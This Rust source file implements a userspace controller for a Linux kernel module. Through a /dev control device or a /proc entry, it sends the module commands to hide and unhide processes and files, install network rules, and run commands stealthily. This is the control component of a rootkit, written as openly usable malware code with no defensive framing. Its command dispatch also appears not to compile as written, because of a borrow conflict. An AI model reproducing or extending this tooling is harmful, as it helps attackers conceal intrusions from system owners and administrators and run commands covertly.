use std::collections::HashMap;
use std::error::Error;
use std::fs::{File, OpenOptions};
use std::io::{Read, Write, Seek, SeekFrom};
use std::os::unix::io::AsRawFd;
use std::path::Path;
use serde::{Deserialize, Serialize};
use serde_json;

/// Userspace controller for communicating with the LKM
pub struct UserspaceController {
    /// Name of the kernel module
    module_name: String,
    /// Control device file handle
    control_device: Option<File>,
    /// Proc interface file handle
    proc_interface: Option<File>,
    /// Cached hidden processes
    hidden_processes: Vec<u32>,
    /// Cached hidden files
    hidden_files: Vec<String>,
    /// Active network rules
    network_rules: HashMap<String, NetworkRule>,
    /// Controller status
    active: bool,
}

/// Network rule for the kernel module
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkRule {
    pub id: String,
    pub src_ip: Option<String>,
    pub dst_ip: Option<String>,
    pub src_port: Option<u16>,
    pub dst_port: Option<u16>,
    pub protocol: Option<String>,
    pub action: String,
}

/// Command structure for kernel module communication
#[derive(Debug, Serialize, Deserialize)]
struct KernelModuleCommand {
    pub cmd_type: String,
    pub params: serde_json::Value,
}

/// Response structure from kernel module
#[derive(Debug, Serialize, Deserialize)]
struct KernelModuleResponse {
    pub status: String,
    pub message: String,
    pub data: Option<serde_json::Value>,
}

/// Statistics from the kernel module
#[derive(Debug, Serialize, Deserialize)]
pub struct ModuleStats {
    pub hidden_processes_count: u32,
    pub hidden_files_count: u32,
    pub network_rules_count: u32,
    pub total_operations: u64,
    pub last_operation_time: u64,
    pub memory_usage: u64,
}

impl UserspaceController {
    /// Create a new userspace controller for the given module
    pub fn new(module_name: &str) -> Result<Self, Box<dyn Error>> {
        let mut controller = Self {
            module_name: module_name.to_string(),
            control_device: None,
            proc_interface: None,
            hidden_processes: Vec::new(),
            hidden_files: Vec::new(),
            network_rules: HashMap::new(),
            active: false,
        };

        controller.initialize()?;
        Ok(controller)
    }

    /// Initialize communication interfaces with the kernel module
    fn initialize(&mut self) -> Result<(), Box<dyn Error>> {
        // Try to open control device
        let control_device_path = format!("/dev/{}_control", self.module_name);
        if Path::new(&control_device_path).exists() {
            match OpenOptions::new()
                .read(true)
                .write(true)
                .open(&control_device_path)
            {
                Ok(device) => {
                    self.control_device = Some(device);
                }
                Err(e) => {
                    eprintln!("Failed to open control device {}: {}", control_device_path, e);
                }
            }
        }

        // Try to open proc interface
        let proc_interface_path = format!("/proc/{}", self.module_name);
        if Path::new(&proc_interface_path).exists() {
            match OpenOptions::new()
                .read(true)
                .write(true)
                .open(&proc_interface_path)
            {
                Ok(proc_file) => {
                    self.proc_interface = Some(proc_file);
                }
                Err(e) => {
                    eprintln!("Failed to open proc interface {}: {}", proc_interface_path, e);
                }
            }
        }

        // Ensure at least one communication method is available
        if self.control_device.is_none() && self.proc_interface.is_none() {
            return Err(format!("No communication interface available for module {}", self.module_name).into());
        }

        // Test communication with kernel module
        match self.test_communication() {
            Ok(_) => {
                self.active = true;
                self.sync_with_kernel()?;
            }
            Err(e) => {
                return Err(format!("Failed to establish communication with kernel module: {}", e).into());
            }
        }

        Ok(())
    }

    /// Test communication with the kernel module
    fn test_communication(&mut self) -> Result<(), Box<dyn Error>> {
        let test_cmd = KernelModuleCommand {
            cmd_type: "ping".to_string(),
            params: serde_json::json!({}),
        };

        let response = self.send_command_internal(test_cmd)?;
        
        if response.status != "success" {
            return Err(format!("Kernel module ping failed: {}", response.message).into());
        }

        Ok(())
    }

    /// Synchronize state with kernel module
    fn sync_with_kernel(&mut self) -> Result<(), Box<dyn Error>> {
        // Get current hidden processes
        if let Ok(processes) = self.get_hidden_processes_internal() {
            self.hidden_processes = processes;
        }

        // Get current hidden files
        if let Ok(files) = self.get_hidden_files_internal() {
            self.hidden_files = files;
        }

        // Get current network rules
        if let Ok(rules) = self.get_network_rules_internal() {
            self.network_rules = rules;
        }

        Ok(())
    }

    /// Send command to kernel module via preferred interface
    fn send_command_internal(&mut self, command: KernelModuleCommand) -> Result<KernelModuleResponse, Box<dyn Error>> {
        let command_json = serde_json::to_string(&command)?;

        // Try control device first
        if let Some(ref mut device) = self.control_device {
            match self.send_via_control_device(device, &command_json) {
                Ok(response) => return Ok(response),
                Err(e) => {
                    eprintln!("Control device communication failed: {}", e);
                }
            }
        }

        // Fallback to proc interface
        if let Some(ref mut proc_file) = self.proc_interface {
            match self.send_via_proc_interface(proc_file, &command_json) {
                Ok(response) => return Ok(response),
                Err(e) => {
                    eprintln!("Proc interface communication failed: {}", e);
                }
            }
        }

        Err("All communication methods failed".into())
    }

    /// Send command via control device
    fn send_via_control_device(&self, device: &mut File, command: &str) -> Result<KernelModuleResponse, Box<dyn Error>> {
        // Write command to device
        device.write_all(command.as_bytes())?;
        device.write_all(b"\n")?;

        // Read response
        let mut response_buffer = String::new();
        device.read_to_string(&mut response_buffer)?;

        // Parse response
        let response: KernelModuleResponse = serde_json::from_str(&response_buffer)?;
        Ok(response)
    }

    /// Send command via proc interface
    fn send_via_proc_interface(&self, proc_file: &mut File, command: &str) -> Result<KernelModuleResponse, Box<dyn Error>> {
        // Seek to beginning
        proc_file.seek(SeekFrom::Start(0))?;
        
        // Write command
        proc_file.write_all(command.as_bytes())?;
        proc_file.write_all(b"\n")?;

        // Seek to beginning for reading
        proc_file.seek(SeekFrom::Start(0))?;

        // Read response
        let mut response_buffer = String::new();
        proc_file.read_to_string(&mut response_buffer)?;

        // Parse response
        let response: KernelModuleResponse = serde_json::from_str(&response_buffer)?;
        Ok(response)
    }

    /// Execute a command through the userspace controller
    pub fn execute_command(&mut self, command: &str, params: &str) -> Result<String, Box<dyn Error>> {
        if !self.active {
            return Err("Controller is not active".into());
        }

        match command {
            "hide_process" => {
                let pid: u32 = params.parse()?;
                self.hide_process(pid)
            }
            "unhide_process" => {
                let pid: u32 = params.parse()?;
                self.unhide_process(pid)
            }
            "hide_file" => {
                self.hide_file(params)
            }
            "unhide_file" => {
                self.unhide_file(params)
            }
            "list_hidden_processes" => {
                Ok(serde_json::to_string(&self.hidden_processes)?)
            }
            "list_hidden_files" => {
                Ok(serde_json::to_string(&self.hidden_files)?)
            }
            "install_net_rule" => {
                let rule: NetworkRule = serde_json::from_str(params)?;
                self.install_network_rule(rule)
            }
            "remove_net_rule" => {
                self.remove_network_rule(params)
            }
            "get_stats" => {
                let stats = self.get_module_stats()?;
                Ok(serde_json::to_string(&stats)?)
            }
            "stealth_exec" => {
                self.stealth_execute(params)
            }
            _ => Err(format!("Unknown command: {}", command).into()),
        }
    }

    /// Hide a process by PID
    pub fn hide_process(&mut self, pid: u32) -> Result<String, Box<dyn Error>> {
        let cmd = KernelModuleCommand {
            cmd_type: "hide_process".to_string(),
            params: serde_json::json!({ "pid": pid }),
        };

        let response = self.send_command_internal(cmd)?;
        
        if response.status == "success" {
            if !self.hidden_processes.contains(&pid) {
                self.hidden_processes.push(pid);
            }
            Ok(format!("Successfully hid process {}", pid))
        } else {
            Err(response.message.into())
        }
    }

    /// Unhide a process by PID
    pub fn unhide_process(&mut self, pid: u32) -> Result<String, Box<dyn Error>> {
        let cmd = KernelModuleCommand {
            cmd_type: "unhide_process".to_string(),
            params: serde_json::json!({ "pid": pid }),
        };

        let response = self.send_command_internal(cmd)?;
        
        if response.status == "success" {
            self.hidden_processes.retain(|&x| x != pid);
            Ok(format!("Successfully unhid process {}", pid))
        } else {
            Err(response.message.into())
        }
    }

    /// Hide a file or directory
    pub fn hide_file(&mut self, path: &str) -> Result<String, Box<dyn Error>> {
        let cmd = KernelModuleCommand {
            cmd_type: "hide_file".to_string(),
            params: serde_json::json!({ "path": path }),
        };

        let response = self.send_command_internal(cmd)?;
        
        if response.status == "success" {
            if !self.hidden_files.contains(&path.to_string()) {
                self.hidden_files.push(path.to_string());
            }
            Ok(format!("Successfully hid file/directory: {}", path))
        } else {
            Err(response.message.into())
        }
    }

    /// Unhide a file or directory
    pub fn unhide_file(&mut self, path: &str) -> Result<String, Box<dyn Error>> {
        let cmd = KernelModuleCommand {
            cmd_type: "unhide_file".to_string(),
            params: serde_json::json!({ "path": path }),
        };

        let response = self.send_command_internal(cmd)?;
        
        if response.status == "success" {
            self.hidden_files.retain(|x| x != path);
            Ok(format!("Successfully unhid file/directory: {}", path))
        } else {
            Err(response.message.into())
        }
    }

    /// Install a network filtering rule
    pub fn install_network_rule(&mut self, rule: NetworkRule) -> Result<String, Box<dyn Error>> {
        let cmd = KernelModuleCommand {
            cmd_type: "install_net_rule".to_string(),
            params: serde_json::to_value(&rule)?,
        };

        let response = self.send_command_internal(cmd)?;
        
        if response.status == "success" {
            self.network_rules.insert(rule.id.clone(), rule);
            Ok("Network rule installed successfully".to_string())
        } else {
            Err(response.message.into())
        }
    }

    /// Remove a network filtering rule
    pub fn remove_network_rule(&mut self, rule_id: &str) -> Result<String, Box<dyn Error>> {
        let cmd = KernelModuleCommand {
            cmd_type: "remove_net_rule".to_string(),
            params: serde_json::json!({ "rule_id": rule_id }),
        };

        let response = self.send_command_internal(cmd)?;
        
        if response.status == "success" {
            self.network_rules.remove(rule_id);
            Ok("Network rule removed successfully".to_string())
        } else {
            Err(response.message.into())
        }
    }

    /// Execute a command stealthily through the kernel module
    pub fn stealth_execute(&mut self, params: &str) -> Result<String, Box<dyn Error>> {
        let exec_params: serde_json::Value = serde_json::from_str(params)?;
        
        let cmd = KernelModuleCommand {
            cmd_type: "stealth_exec".to_string(),
            params: exec_params,
        };

        let response = self.send_command_internal(cmd)?;
        
        if response.status == "success" {
            if let Some(output) = response.data {
                Ok(output.to_string())
            } else {
                Ok("Command executed successfully".to_string())
            }
        } else {
            Err(response.message.into())
        }
    }

    /// Get current module statistics
    pub fn get_module_stats(&mut self) -> Result<ModuleStats, Box<dyn Error>> {
        let cmd = KernelModuleCommand {
            cmd_type: "get_stats".to_string(),
            params: serde_json::json!({}),
        };

        let response = self.send_command_internal(cmd)?;
        
        if response.status == "success" {
            if let Some(data) = response.data {
                let stats: ModuleStats = serde_json::from_value(data)?;
                Ok(stats)
            } else {
                Err("No statistics data received".into())
            }
        } else {
            Err(response.message.into())
        }
    }

    /// Get hidden processes from kernel module
    fn get_hidden_processes_internal(&mut self) -> Result<Vec<u32>, Box<dyn Error>> {
        let cmd = KernelModuleCommand {
            cmd_type: "list_hidden_processes".to_string(),
            params: serde_json::json!({}),
        };

        let response = self.send_command_internal(cmd)?;
        
        if response.status == "success" {
            if let Some(data) = response.data {
                let processes: Vec<u32> = serde_json::from_value(data)?;
                Ok(processes)
            } else {
                Ok(Vec::new())
            }
        } else {
            Err(response.message.into())
        }
    }

    /// Get hidden files from kernel module
    fn get_hidden_files_internal(&mut self) -> Result<Vec<String>, Box<dyn Error>> {
        let cmd = KernelModuleCommand {
            cmd_type: "list_hidden_files".to_string(),
            params: serde_json::json!({}),
        };

        let response = self.send_command_internal(cmd)?;
        
        if response.status == "success" {
            if let Some(data) = response.data {
                let files: Vec<String> = serde_json::from_value(data)?;
                Ok(files)
            } else {
                Ok(Vec::new())
            }
        } else {
            Err(response.message.into())
        }
    }

    /// Get network rules from kernel module
    fn get_network_rules_internal(&mut self) -> Result<HashMap<String, NetworkRule>, Box<dyn Error>> {
        let cmd = KernelModuleCommand {
            cmd_type: "list_net_rules".to_string(),
            params: serde_json::json!({}),
        };

        let response = self.send_command_internal(cmd)?;
        
        if response.status == "success" {
            if let Some(data) = response.data {
                let rules: HashMap<String, NetworkRule> = serde_json::from_value(data)?;
                Ok(rules)
            } else {
                Ok(HashMap::new())
            }
        } else {
            Err(response.message.into())
        }
    }

    /// Check if controller is active
    pub fn is_active(&self) -> bool {
        self.active
    }

    /// Get current hidden processes count
    pub fn get_hidden_processes_count(&self) -> usize {
        self.hidden_processes.len()
    }

    /// Get current hidden files count
    pub fn get_hidden_files_count(&self) -> usize {
        self.hidden_files.len()
    }

    /// Get current network rules count
    pub fn get_network_rules_count(&self) -> usize {
        self.network_rules.len()
    }

    /// Clean up the controller
    pub fn cleanup(&mut self) -> Result<(), Box<dyn Error>> {
        if !self.active {
            return Ok(());
        }

        // Send cleanup command to kernel module
        let cmd = KernelModuleCommand {
            cmd_type: "cleanup".to_string(),
            params: serde_json::json!({}),
        };

        let _ = self.send_command_internal(cmd); // Ignore errors during cleanup

        // Close file handles
        self.control_device = None;
        self.proc_interface = None;

        // Clear cached data
        self.hidden_processes.clear();
        self.hidden_files.clear();
        self.network_rules.clear();

        self.active = false;
        Ok(())
    }
}

impl Drop for UserspaceController {
    fn drop(&mut self) {
        let _ = self.cleanup();
    }
}